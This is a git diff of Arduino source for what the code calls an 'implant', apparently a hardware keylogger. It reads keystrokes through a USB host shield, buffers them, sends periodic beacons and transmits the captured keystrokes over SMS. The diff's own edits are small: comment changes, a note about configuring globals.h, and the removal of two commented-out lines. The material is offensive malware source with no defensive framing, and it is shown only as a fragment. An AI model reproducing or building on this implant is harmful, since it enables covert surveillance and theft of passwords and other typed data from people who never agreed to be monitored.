@@ -3,6 +3,8 @@
  *  #define _SS_MAX_RX_BUFF 64 // RX buffer size
  *  to
  *  #define _SS_MAX_RX_BUFF 256 // RX buffer size
+ *
+ * You need to set your info in globals.h
 */
 #include <SoftwareSerial.h>
 #include <Keyboard.h>
@@ -11,7 +13,6 @@
 #include "utils.h"
 #include "globals.h"
 
-//USBhost = C_USBhost(Serial1, /*debug_state*/false);
 #ifdef DEBUG
 C_USBhost USBhost = C_USBhost(Serial1, 1);
 #else
@@ -60,7 +61,7 @@ void loop(){
   captured_key = USBhost.GetKey();    
 
   // Send a beacon so we know that the implant is up
-  // ToDo: this can infere with payloads execution
+  // ToDo: this can infere with payloads execution. Use only when user is not typing
   if (!pendingSMS && (unsigned long)((currentMillis - previousMillisBeacon)/ 60000) >= BEACON_TIME){
       String msg = "Beacon - ";
       msg += IMPLANT_NAME;
@@ -124,7 +125,6 @@ void loop(){
         pendingSMS = false;
         
         SMSSerialFlush(); // just is case there is something else in the serial
-        //mutex_SMS = false; // we can now listen for commands
         
         // We removed from the buffer the characters that were sent
         buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
